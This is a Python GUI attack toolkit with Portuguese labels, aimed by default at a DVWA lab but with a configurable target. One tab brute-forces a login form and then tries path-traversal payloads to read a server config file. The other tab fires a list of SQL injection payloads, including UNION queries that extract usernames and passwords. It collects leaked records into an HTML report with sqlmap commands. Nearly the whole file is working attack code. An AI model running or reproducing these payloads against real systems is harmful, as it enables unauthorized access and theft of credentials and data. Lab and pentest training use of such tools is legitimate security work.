#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DVWA Hacker ToolKit - Brute Force + LFI + SQLi Scanner (abas separadas)
Uso autorizado apenas (laboratório / pentest com permissão).
Dependências: pip install requests
"""

import threading
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import requests
import re
import os
import urllib3
import urllib.parse
import webbrowser
import html
import time
import datetime
import platform

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
#                     TEMA HACKER VERDE
# ============================================================
BG = "#0a0f0a"          # fundo quase preto
BG_FRAME = "#0f1a0f"    # fundo de frames
FG = "#00ff41"          # verde terminal
FG_DIM = "#00b32d"      # verde mais escuro
FG_BRIGHT = "#ffb84d"   # laranja claro (destaque de abas, botões e achados)
BG_ENTRY = "#04140a"    # fundo de campos
RED = "#ff3333"
YELLOW = "#ffee00"
PUMPKIN = "#ff6600"     # laranja abóbora (credencial válida, LFI e dados vazados)

def apply_hacker_theme(root):
    style = ttk.Style(root)
    style.theme_use("clam")
    style.configure(".", background=BG, foreground=FG, font=("Consolas", 10))
    style.configure("TFrame", background=BG)
    style.configure("TLabel", background=BG, foreground=FG)
    style.configure("TLabelframe", background=BG, foreground=FG, bordercolor=FG_DIM)
    style.configure("TLabelframe.Label", background=BG, foreground=FG,
                    font=("Consolas", 10, "bold"))
    style.configure("TButton", background=BG_FRAME, foreground=FG_BRIGHT,
                    bordercolor=FG_DIM, focusthickness=1)
    style.map("TButton",
              background=[("active", "#1a2a1a")],
              foreground=[("active", FG_BRIGHT)])
    style.configure("TEntry", fieldbackground=BG_ENTRY, foreground=FG,
                    insertcolor=FG, bordercolor=FG_DIM)
    style.configure("TNotebook", background=BG, bordercolor=FG_DIM)
    style.configure("TNotebook.Tab", background=BG_FRAME, foreground=FG_BRIGHT,
                    padding=[14, 6], font=("Consolas", 10, "bold"))
    style.map("TNotebook.Tab",
              background=[("selected", "#123312")],
              foreground=[("selected", FG_BRIGHT)])
    root.configure(bg=BG)


# ============================================================
#                  ABA 1: BRUTE FORCE + LFI
# ============================================================
class DvwaBruteLfiTab(ttk.Frame):
    def __init__(self, parent):
        super().__init__(parent, style="TFrame")
        self.running = False
        self.session = requests.Session()
        self._build_ui()

    def _build_ui(self):
        frame = ttk.LabelFrame(self, text="[ CONFIGURAÇÃO ]", padding=10)
        frame.pack(fill="x", padx=10, pady=5)

        ttk.Label(frame, text="URL Login:").grid(row=0, column=0, sticky="w")
        self.url_entry = ttk.Entry(frame, width=58)
        self.url_entry.insert(0, "http://192.168.0.11/dvwa/login.php")
        self.url_entry.grid(row=0, column=1, pady=3)

        ttk.Label(frame, text="Wordlist:").grid(row=1, column=0, sticky="w")
        self.wordlist_entry = ttk.Entry(frame, width=58)
        self.wordlist_entry.grid(row=1, column=1, pady=3)
        ttk.Button(frame, text="Procurar...", command=self._browse).grid(row=1, column=2)

        ttk.Label(frame, text="Usuário:").grid(row=2, column=0, sticky="w")
        self.user_entry = ttk.Entry(frame, width=30)
        self.user_entry.insert(0, "admin")
        self.user_entry.grid(row=2, column=1, sticky="w", pady=3)

        ttk.Label(frame, text="Arquivo alvo (LFI):").grid(row=3, column=0, sticky="w")
        self.file_entry = ttk.Entry(frame, width=58)
        self.file_entry.insert(0, "/var/www/dvwa/config/config.inc.php")
        self.file_entry.grid(row=3, column=1, pady=3)

        btn_frame = ttk.Frame(frame)
        btn_frame.grid(row=4, column=1, sticky="w", pady=5)
        self.btn_start = ttk.Button(btn_frame, text="[ INICIAR ]", command=self.start)
        self.btn_start.pack(side="left", padx=3)
        self.btn_stop = ttk.Button(btn_frame, text="[ PARAR ]", command=self.stop, state="disabled")
        self.btn_stop.pack(side="left", padx=3)

        out_frame = ttk.LabelFrame(self, text="[ SAÍDA ]", padding=5)
        out_frame.pack(fill="both", expand=True, padx=10, pady=5)
        self.log = scrolledtext.ScrolledText(out_frame, state="disabled",
                                             bg=BG_ENTRY, fg=FG, insertbackground=FG,
                                             font=("Consolas", 9))
        self.log.pack(fill="both", expand=True)
        self.log.tag_configure("pumpkin", foreground=PUMPKIN,
                               font=("Consolas", 10, "bold"))
        self.log.tag_configure("bright", foreground=FG_BRIGHT,
                               font=("Consolas", 9, "bold"))

    def _browse(self):
        path = filedialog.askopenfilename(title="Selecione a wordlist")
        if path:
            self.wordlist_entry.delete(0, "end")
            self.wordlist_entry.insert(0, path)

    def log_msg(self, msg, tag=None):
        self.log.configure(state="normal")
        if tag:
            self.log.insert("end", msg + "\n", tag)
        else:
            self.log.insert("end", msg + "\n")
        self.log.see("end")
        self.log.configure(state="disabled")

    def start(self):
        url = self.url_entry.get().strip()
        wordlist = self.wordlist_entry.get().strip()
        if not url or not wordlist:
            messagebox.showerror("Erro", "Informe a URL e a wordlist.")
            return
        if not os.path.isfile(wordlist):
            messagebox.showerror("Erro", "Wordlist não encontrada.")
            return
        self.session = requests.Session()
        self.running = True
        self.btn_start.configure(state="disabled")
        self.btn_stop.configure(state="normal")
        threading.Thread(target=self.run, args=(url, wordlist), daemon=True).start()

    def stop(self):
        self.running = False
        self.btn_start.configure(state="normal")
        self.btn_stop.configure(state="disabled")

    def _get_token(self, url):
        r = self.session.get(url, verify=False, timeout=10)
        m = re.search(r"user_token'?\s*value='([^']+)'", r.text)
        return m.group(1) if m else None

    def _save_found(self, content, tag):
        fname = f"encontrado_{tag}.txt"
        with open(fname, "w", encoding="utf-8", errors="replace") as f:
            f.write(content)
        self.log_msg(f"[+] Conteúdo salvo em: {os.path.abspath(fname)}", "bright")

    def run(self, url, wordlist):
        base = url.rsplit("/", 1)[0]

        self.log_msg("[*] Fase 1: Brute force no login", "bright")
        creds = None
        try:
            with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [l.strip() for l in f
                             if l.strip() and not l.lstrip().startswith("#")]
        except Exception as e:
            self.log_msg(f"[!] Erro ao ler wordlist: {e}")
            self._done()
            return

        self.log_msg(f"\n[*] {len(passwords)} senhas carregadas\n")

        for pwd in passwords:
            if not self.running:
                break
            try:
                token = self._get_token(url)
                data = {
                    "username": self.user_entry.get().strip(),
                    "password": pwd,
                    "Login": "Login",
                }
                if token:
                    data["user_token"] = token
                r = self.session.post(url, data=data, verify=False, timeout=10,
                                      allow_redirects=True)
                if "login.php" not in r.url and r.status_code == 200:
                    self.log_msg("=" * 60, "pumpkin")
                    self.log_msg(f"[+] CREDENCIAL VÁLIDA: {data['username']} / {pwd}", "pumpkin")
                    self.log_msg("=" * 60, "pumpkin")
                    self.log_msg("")
                    creds = (data["username"], pwd)
                    break
                self.log_msg(f"    Testando: {data['username']}:{pwd:<50} -> falha")
            except Exception as e:
                self.log_msg(f"[!] Erro: {e}")

        if not creds:
            self.log_msg("\n[-] Nenhuma credencial encontrada. Continuando teste LFI sem login\n")

        target_file = self.file_entry.get().strip()
        self.log_msg(f"[*] Fase 2: Testando LFI para {target_file}\n", "bright")

        traversal = "../" * 6 + target_file.lstrip("/")
        candidates = [
            traversal,
            traversal.replace("../", "....//"),
            "/" + target_file.lstrip("/"),
            "..\\..\\" * 6 + target_file.lstrip("/"),
        ]

        lfi_url = f"{base}/vulnerabilities/fi/?page="
        found = False
        for payload in candidates:
            if not self.running or found:
                break
            try:
                r = self.session.get(lfi_url + payload, verify=False, timeout=10)
                if "db_" in r.text or "$_DVWA" in r.text or "config.inc" in r.text:
                    self.log_msg(f"[+] ARQUIVO ENCONTRADO via payload: {payload}", "pumpkin")
                    self._save_found(r.text, "lfi_config")
                    found = True
                else:
                    self.log_msg(f"    Tentativa '{payload[:60]}...' -> sem conteúdo do config")
            except Exception as e:
                self.log_msg(f"[!] Erro: {e}")

        if not found:
            self.log_msg("\n[-] LFI não confirmado. Verifique se está logado e se o nível")
            self.log_msg("    de segurança do DVWA está em: low     (http://SEU_IP/dvwa/security.php)\n")

        self._done()

    def _done(self):
        self.running = False
        self.after(0, lambda: (self.btn_start.configure(state="normal"),
                               self.btn_stop.configure(state="disabled")))
        self.log_msg("\n\n[*] Finalizado")


# ============================================================
#                    ABA 2: SQLi SCANNER
# ============================================================
PAYLOADS = [
    ("'", "Erro SQL clássico"),
    ("1'", "Erro de sintaxe após número"),
    ("1' AND extractvalue(1, concat(0x7e, version()))-- ", "Error-based MySQL extractvalue"),
    ("1' AND updatexml(1, concat(0x7e, version()), 1)-- ", "Error-based MySQL updatexml"),
    ("1' AND 1=CONVERT(int, @@version)-- ", "Error-based MSSQL"),
    ("' OR '1'='1", "Bypass clássico string"),
    ("1' OR '1'='1", "Bypass de autenticação (OR 1=1)"),
    ("1 OR 1=1", "Bypass numérico"),
    ("1' OR '1'='1' -- ", "Bypass com comentário"),
    ("' OR 1=1#", "Bypass hash comment"),
    ("admin'-- ", "Login bypass admin"),
    ("1 AND 1=1", "Booleano TRUE (baseline)"),
    ("1 AND 1=2", "Booleano FALSE"),
    ("1' AND '1'='1", "Booleano string TRUE"),
    ("1' AND '1'='2", "Booleano string FALSE"),
    ("1' AND SLEEP(5)-- ", "Time-based MySQL"),
    ("1 AND SLEEP(5)", "Time-based MySQL numérico"),
    ("1'; WAITFOR DELAY '0:0:5'-- ", "Time-based MSSQL"),
    ("1' AND pg_sleep(5)-- ", "Time-based PostgreSQL"),
    ("1' AND BENCHMARK(5000000, SHA1('t'))-- ", "Time-based BENCHMARK"),
    ("1 UNION SELECT NULL-- ", "UNION 1 coluna"),
    ("1 UNION SELECT NULL,NULL-- ", "UNION 2 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL-- ", "UNION 3 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL,NULL-- ", "UNION 4 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL-- ", "UNION 5 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ", "UNION 6 colunas"),
    ("1' UNION SELECT NULL,NULL-- ", "UNION string 2 colunas"),
    ("1' UNION SELECT NULL,NULL,NULL-- ", "UNION string 3 colunas"),
    ("1' UNION SELECT version(),database()-- ", "UNION extraindo versão/banco"),
    ("1' UNION SELECT table_name,NULL FROM information_schema.tables-- ", "UNION listando tabelas"),
    ("1' UNION SELECT user,password FROM users-- ", "UNION extraindo credenciais (DVWA)"),
    ("1' UNION SELECT @@version,@@datadir-- ", "UNION MSSQL/MySQL info"),
    ("1/**/OR/**/1=1", "Inline comments"),
    ("1 /*!50000OR*/ 1=1", "MySQL version comment"),
    ("1 OR 0x31=0x31", "Hex encoding"),
    ("1 %00OR 1=1", "Null byte"),
]

SQL_ERRORS = [
    "you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
    "quoted string not properly terminated", "mysql_fetch", "pg_query",
    "sqlite3.operationalerror", "ora-01756", "microsoft ole db provider",
    "odbc sql server driver", "syntax error", "unterminated string",
    "sqlsyntaxerrorexception", "error in your sql",
]

TIME_LIMIT = 10
session = requests.Session()
session.headers["User-Agent"] = "Mozilla/5.0 (SQLi-Scanner-GUI; Auth-Test)"


def extract_leaked_data(body):
    data = []
    ids = re.findall(r"ID:\s*(.*?)<br", body) or re.findall(r"ID:\s*([^\n<]+)", body)
    firsts = re.findall(r"First name:\s*(.*?)<br", body) or re.findall(r"First name:\s*([^\n<]+)", body)
    surnames = re.findall(r"Surname:\s*(.*?)<br", body) or re.findall(r"Surname:\s*([^\n<]+)", body)
    n = max(len(ids), len(firsts), len(surnames))
    if n:
        for i in range(n):
            f = firsts[i].strip() if i < len(firsts) else ""
            s = surnames[i].strip() if i < len(surnames) else ""
            data.append(f"{f} {s}".strip())
        return data
    rows = re.findall(r"<tr>\s*<td>(.*?)</td>\s*<td>(.*?)</td>", body, re.S)
    for a, b in rows[:20]:
        clean = lambda x: re.sub(r"<.*?>", "", x).strip()
        data.append(f"{clean(a)} | {clean(b)}")
    return data


class SqliScannerTab(ttk.Frame):
    def __init__(self, parent):
        super().__init__(parent, style="TFrame")
        self.results, self.findings = [], []
        self._build_ui()

    def _build_ui(self):
        frm = ttk.LabelFrame(self, text="[ SQL INJECTION SCANNER ]", padding=10)
        frm.pack(fill="both", expand=True, padx=10, pady=5)
        frm.columnconfigure(1, weight=1)
        frm.rowconfigure(3, weight=1)

        ttk.Label(frm, text="URL alvo:").grid(row=0, column=0, sticky="w")
        self.url_entry = ttk.Entry(frm)
        self.url_entry.grid(row=0, column=1, padx=5, sticky="ew")
        self.url_entry.insert(0, "http://192.168.0.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit")

        ttk.Label(frm, text="Cookie:").grid(row=1, column=0, sticky="w")
        self.cookie_entry = ttk.Entry(frm)
        self.cookie_entry.grid(row=1, column=1, padx=5, sticky="ew")
        self.cookie_entry.insert(0, "PHPSESSID=ulso8kb0s63fgm9i11kp4d1021; security=low")

        ttk.Label(frm, text="Parâmetros POST\n(vazio = só GET):").grid(row=2, column=0, sticky="w")
        self.post_entry = ttk.Entry(frm)
        self.post_entry.grid(row=2, column=1, padx=5, sticky="ew")
        self.post_entry.insert(0, "Submit=Submit")

        self.btn = ttk.Button(frm, text="[ ESCANEAR ]", command=self.start)
        self.btn.grid(row=0, column=2, rowspan=2)

        self.log = scrolledtext.ScrolledText(frm, height=22, bg=BG_ENTRY, fg=FG,
                                             insertbackground=FG, font=("Consolas", 9))
        self.log.grid(row=3, column=0, columnspan=3, sticky="nsew", pady=10)
        self.log.tag_configure("bright", foreground=FG_BRIGHT,
                               font=("Consolas", 9, "bold"))
        self.log.tag_configure("pumpkin", foreground=PUMPKIN,
                               font=("Consolas", 10, "bold"))

        ttk.Button(frm, text="[ SALVAR RELATÓRIO HTML ]", command=self.save).grid(row=4, column=1)

    def write(self, txt, tag=None):
        if tag:
            self.log.insert("end", txt + "\n", tag)
        else:
            self.log.insert("end", txt + "\n")
        self.log.see("end")

    def start(self):
        url = self.url_entry.get().strip()
        if not url:
            return
        cookies = {}
        for part in self.cookie_entry.get().split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                cookies[k] = v
        session.cookies.clear()
        session.cookies.update(cookies)

        self.log.delete("1.0", "end")
        self.results, self.findings = [], []
        self.btn.config(state="disabled")
        threading.Thread(target=self.scan, args=(url,), daemon=True).start()

    def build_request(self, url, param, payload):
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        post_data = None
        if not qs:
            post_data = urllib.parse.parse_qs(self.post_entry.get())
            if param in post_data:
                post_data[param] = payload
                return url, post_data
            return None, None
        new_qs = dict(qs)
        new_qs[param] = payload
        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_qs, doseq=True))), None

    def send(self, url, data=None):
        t0 = time.time()
        try:
            r = session.get(url, timeout=TIME_LIMIT) if data is None else session.post(url, data=data, timeout=TIME_LIMIT)
        except requests.RequestException as e:
            return None, 0, str(e)
        return r, time.time() - t0, None

    def scan(self, url):
        parsed = urllib.parse.urlparse(url)
        get_params = urllib.parse.parse_qs(parsed.query)
        post_params = urllib.parse.parse_qs(self.post_entry.get()) if self.post_entry.get().strip() else {}
        params = get_params or post_params
        self.write(f"[*] Alvo: {url}\n", "bright")
        if not params:
            self.write("[!] Nenhum parâmetro detectado.")
            self.btn.config(state="normal")
            return

        params = {k: v for k, v in params.items() if k.lower() != "submit"}

        base_r, _, _ = self.send(url, post_params if not get_params else None)
        base_len = len(base_r.text) if base_r else 0

        for param in list(params):
            true_len, false_len = None, None
            for payload, tag in (("1 AND 1=1", "TRUE"), ("1 AND 1=2", "FALSE")):
                test_url, data = self.build_request(url, param, payload)
                if not test_url:
                    continue
                r, t, err = self.send(test_url, data)
                if r:
                    if tag == "TRUE":
                        true_len = len(r.text)
                    else:
                        false_len = len(r.text)

            blind_ok = true_len is not None and false_len is not None and abs(true_len - false_len) > 20
            if blind_ok:
                self.write(f"[+] Blind confirmado em '{param}': len(TRUE)={true_len} vs len(FALSE)={false_len}", "bright")

            for payload, desc in PAYLOADS:
                test_url, data = self.build_request(url, param, payload)
                if not test_url:
                    continue
                r, t, err = self.send(test_url, data)
                if err:
                    self.write(f"[-] Erro: {err}")
                    continue

                vuln = None
                body = r.text.lower()
                for e in SQL_ERRORS:
                    if e in body:
                        vuln = f"Erro SQL visível: '{e}'"
                        break
                if not vuln and t > 5 and any(x in payload.lower() for x in ("sleep", "waitfor", "benchmark", "pg_sleep")):
                    vuln = f"Resposta atrasada {t:.1f}s (time-based)"
                if not vuln and blind_ok and ("1=1" in payload or "'1'='1" in payload):
                    if abs(len(r.text) - true_len) < 50 and "and" in payload.lower() and "1=2" not in payload:
                        vuln = f"Blind boolean: resposta idêntica à TRUE ({len(r.text)} bytes)"
                if not vuln and ("or '1'='1" in payload.lower() or "or 1=1" in payload.lower()):
                    if abs(len(r.text) - base_len) > 100:
                        vuln = f"Conteúdo alterado com OR 1=1 (base={base_len}, agora={len(r.text)} bytes)"
                if not vuln and "union select" in payload.lower() and "null,null" in payload.lower():
                    if r.status_code != base_r.status_code and base_r.status_code:
                        vuln = f"UNION alterou status ({base_r.status_code} -> {r.status_code})"
                    elif abs(len(r.text) - base_len) > 100:
                        vuln = f"UNION retornou dados extras (base={base_len}, agora={len(r.text)} bytes)"

                leaked = []
                if vuln or "union select version" in payload.lower() or "from users" in payload.lower() \
                        or "information_schema" in payload.lower() or "or 1=1" in payload.lower():
                    leaked = extract_leaked_data(r.text)
                leaked = [x for x in leaked if payload[:8] not in x or " " in x]

                if vuln:
                    self.write(f"[VULN] {param} = {payload[:38]:<70}  status={r.status_code} len={len(r.text)} t={t:.1f}s", "pumpkin")
                    if leaked:
                        self.write(f"       >>> DADOS VAZADOS ({len(leaked)} registros):", "pumpkin")
                        for item in leaked[:15]:
                            self.write(f"       {item}", "pumpkin")
                        if len(leaked) > 15:
                            self.write(f"       ... e mais {len(leaked)-15} registros", "pumpkin")
                    self.findings.append((param, payload, desc, vuln, test_url, leaked))
                else:
                    self.write(f"[ok  ] {param} = {payload[:38]:<70} status={r.status_code} len={len(r.text)} t={t:.1f}s")
                self.results.append((param, payload, r.status_code, t, bool(vuln), desc, vuln, len(r.text), leaked))
                time.sleep(0.2)

        self.write(f"\n[*] Concluído. {len(self.findings)} vulnerabilidades encontradas", "bright")
        self.btn.config(state="normal")

    def save(self):
        f = filedialog.asksaveasfilename(defaultextension=".html", filetypes=[("HTML", "*.html")])
        if not f:
            return
        now = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")

        rows = ""
        for param, payload, code, t, v, desc, detail, ln, leaked in self.results:
            row_bg = "#2a1210" if v else "#0f1f0f"
            badge = ("<span style='background:#d32f2f;color:#fff;padding:2px 10px;"
                     "border-radius:12px;font-weight:bold'>VULNERÁVEL</span>") if v else \
                    ("<span style='background:#2e7d32;color:#fff;padding:2px 10px;"
                     "border-radius:12px'>OK</span>")
            leak_html = ""
            if leaked:
                items = "".join(f"<div style='padding:2px 0;border-bottom:1px dotted #444;"
                                f"color:#ff6600;font-weight:bold'>&#128203; {html.escape(x)}</div>"
                                for x in leaked[:15])
                leak_html = (f"<div style='background:#1a1a08;border:2px solid #ff6600;"
                             f"border-radius:6px;padding:6px 10px;margin-top:6px;font-size:13px;"
                             f"text-shadow:0 0 4px rgba(255,102,0,.6)'>"
                             f"<b style='color:#ffb84d'>&#9888; Dados vazados (usuários / senhas):</b>{items}</div>")
            rows += (f"<tr style='background:{row_bg}'>"
                     f"<td style='color:#00ff41'><b>{html.escape(param)}</b></td>"
                     f"<td><code class='pay'>{html.escape(payload)}</code></td>"
                     f"<td style='color:#ffb84d'>{html.escape(desc)}</td>"
                     f"<td style='text-align:center;color:#00ff41'>{code}</td>"
                     f"<td style='text-align:center;color:#00ff41'>{ln}</td>"
                     f"<td style='text-align:center;color:#00ff41'>{t:.1f}s</td>"
                     f"<td style='text-align:center'>{badge}</td>"
                     f"<td style='color:#ffb84d'>{html.escape(detail or '—')}{leak_html}</td></tr>")

        exp = ""
        if self.findings:
            exp = "<h2>&#128640; Como explorar</h2><div class='cards'>"
            for i, (param, payload, desc, detail, test_url, leaked) in enumerate(self.findings, 1):
                leak_block = ""
                if leaked:
                    items = "".join(f"<li style='color:#ff6600;font-weight:bold;"
                                    f"text-shadow:0 0 4px rgba(255,102,0,.5)'>{html.escape(x)}</li>" for x in leaked)
                    leak_block = (f"<div class='leak'><b style='color:#ffb84d'>&#128190; Registros extraídos — "
                                  f"usuários / senhas ({len(leaked)}):</b>"
                                  f"<ul style='margin:6px 0 0 0'>{items}</ul></div>")
                exp += (f"<div class='card'><div class='card-title'>Vulnerabilidade #{i} — parâmetro "
                        f"<code>{html.escape(param)}</code></div>"
                        f"<p><b>Payload:</b> <code class='pay'>{html.escape(payload)}</code></p>"
                        f"<p><b>Evidência:</b> {html.escape(detail)}</p>"
                        f"<p><b>URL de prova:</b><br><a class='url' href='{html.escape(test_url)}'>{html.escape(test_url)}</a></p>"
                        f"<p><b>sqlmap:</b><br><code class='cmd'>sqlmap -u \"{html.escape(self.url_entry.get())}\" "
                        f"--cookie=\"{html.escape(self.cookie_entry.get())}\" -p {html.escape(param)} --batch --dbs</code></p>"
                        f"{leak_block}</div>")
            exp += "</div>"
        else:
            exp = "<h2>&#9989; Nenhuma vulnerabilidade confirmada</h2><p>Nenhum payload retornou evidência de SQL Injection.</p>"

        vuln_n = len(self.findings)
        total = len(self.results)

        doc = f"""<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="utf-8">
<title>Relatório de SQL Injection</title>
<style>
* {{ box-sizing: border-box; }}
body {{ font-family: Consolas, monospace; background:#0a0f0a; color:#00ff41; margin:0; padding:30px; }}
.container {{ max-width:1200px; margin:0 auto; }}
header {{ border:1px solid #00b32d; padding:30px 35px; border-radius:12px; margin-bottom:25px;
        background:linear-gradient(135deg,#04140a,#0a2a0a); }}
header h1 {{ margin:0 0 8px 0; font-size:26px; text-shadow:0 0 8px #00ff41; }}
header p {{ margin:3px 0; opacity:.9; font-size:14px; }}
.summary {{ display:flex; gap:15px; margin-bottom:25px; flex-wrap:wrap; }}
.stat {{ flex:1; min-width:180px; background:#0f1a0f; border:1px solid #00b32d; border-radius:10px;
        padding:18px 22px; }}
.stat .num {{ font-size:32px; font-weight:bold; text-shadow:0 0 10px #00ff41; }}
.stat .lbl {{ font-size:13px; color:#00b32d; margin-top:4px; }}
h2 {{ color:#00ff41; border-bottom:3px solid #00b32d; padding-bottom:8px; margin-top:35px; text-shadow:0 0 8px #00ff41; }}
table {{ border-collapse:collapse; width:100%; background:#0f1a0f; border:1px solid #00b32d;
        border-radius:10px; overflow:hidden; font-size:13px; }}
th {{ background:#123312; color:#00ff41; padding:10px 12px; text-align:left; white-space:nowrap; }}
td {{ border-bottom:1px solid #1a2a1a; padding:9px 12px; vertical-align:top; }}
code.pay {{ background:#04140a; color:#ff3333; padding:2px 6px; border-radius:4px; word-break:break-all; font-size:12px; }}
code.cmd {{ display:block; background:#04140a; color:#ffee00; padding:10px 14px; border-radius:6px;
        word-break:break-all; font-size:12px; margin-top:5px; border:1px solid #00b32d; }}
.cards {{ display:grid; grid-template-columns:repeat(auto-fill,minmax(460px,1fr)); gap:18px; }}
.card {{ background:#0f1a0f; border:1px solid #00b32d; border-left:5px solid #d32f2f; border-radius:10px;
        padding:18px 22px; }}
.card-title {{ font-weight:bold; color:#00ff41; margin-bottom:10px; font-size:15px; text-shadow:0 0 6px #00ff41; }}
.card p {{ margin:8px 0; font-size:14px; }}
a.url {{ color:#ffee00; word-break:break-all; }}
.leak {{ background:#1a0e04; border:2px solid #ff6600; border-radius:6px; padding:10px 14px;
        margin-top:10px; font-size:13px; }}
.leak li {{ margin:3px 0; }}
ul.rec li {{ margin:8px 0; font-size:14px; background:#0f1a0f; padding:10px 16px; border-radius:8px;
        border:1px solid #1a2a1a; list-style:none; }}
footer {{ text-align:center; color:#00b32d; font-size:12px; margin-top:40px; }}
</style></head><body><div class="container">
<header>
<h1>&#128737; RELATÓRIO DE SQL INJECTION // HACKER TOOLKIT</h1>
<p><b>Alvo:</b> {html.escape(self.url_entry.get())}</p>
<p><b>Gerado em:</b> {now} — Uso autorizado (teste de segurança)</p>
</header>

<div class="summary">
<div class="stat"><div class="num" style="color:#ff3333">{vuln_n}</div><div class="lbl">Vulnerabilidades encontradas</div></div>
<div class="stat"><div class="num">{total}</div><div class="lbl">Testes executados</div></div>
<div class="stat"><div class="num" style="color:#ff6600">{sum(1 for r in self.results if r[8])}</div><div class="lbl">Com usuários/senhas vazados</div></div>
</div>

{exp}

<h2>&#128203; Detalhes de todos os testes</h2>
<table>
<tr><th>Parâmetro</th><th>Payload</th><th>Técnica</th><th>Status</th><th>Bytes</th><th>Tempo</th><th>Resultado</th><th>Evidência</th></tr>
{rows}
</table>

<h2>&#128274; Recomendações de correção</h2>
<ul class="rec">
<li><b>Queries parametrizadas:</b> use prepared statements (PDO no PHP, mysqli com bind_param) — nunca concatene entrada do usuário na query.</li>
<li><b>Validação de entrada:</b> valide tipos e formatos (ex: <code>intval()</code> para IDs numéricos).</li>
<li><b>Menor privilégio:</b> o usuário do banco não deve ter permissões de DROP/FILE/admin.</li>
<li><b>WAF:</b> regra adicional, não substitui código seguro.</li>
<li><b>Mensagens de erro:</b> não exiba erros SQL ao usuário (display_errors off em produção).</li>
</ul>

<footer>// Gerado por Hacker ToolKit — Somente para testes autorizados //</footer>
</div></body></html>"""
        with open(f, "w", encoding="utf-8") as fh:
            fh.write(doc)
        self.write(f"[+] Relatório salvo: {f}", "bright")
        webbrowser.open(f)


# ============================================================
#                        APP PRINCIPAL
# ============================================================
class HackerToolKit(tk.Tk):

    def __init__(self):
        super().__init__()

        self.title("/// HACKER TOOLKIT — DVWA Brute Force | LFI | SQLi Scanner ///")
        self.geometry("1000x720")
        self.configure(bg=BG)

        apply_hacker_theme(self)

        # MAXIMIZAR AUTOMATICAMENTE
        try:
            if platform.system() == "Windows":
                self.after(100, lambda: self.state("zoomed"))
            else:
                self.after(200, lambda: self.attributes("-zoomed", True))
        except Exception:
            pass

        header = tk.Label(self, text="H A C K E R   T O O L K I T", bg=BG, fg="#00FF00", font=("Consolas", 16, "bold"))
        header.pack(pady=(10, 0))

        nb = ttk.Notebook(self)
        nb.pack(fill="both", expand=True, padx=10, pady=10)

        tab1 = DvwaBruteLfiTab(nb)
        nb.add(tab1, text=" Brute Force + LFI ")

        tab2 = SqliScannerTab(nb)
        nb.add(tab2, text=" SQLi Scanner ")

if __name__ == "__main__":
    app = HackerToolKit()
    app.mainloop()
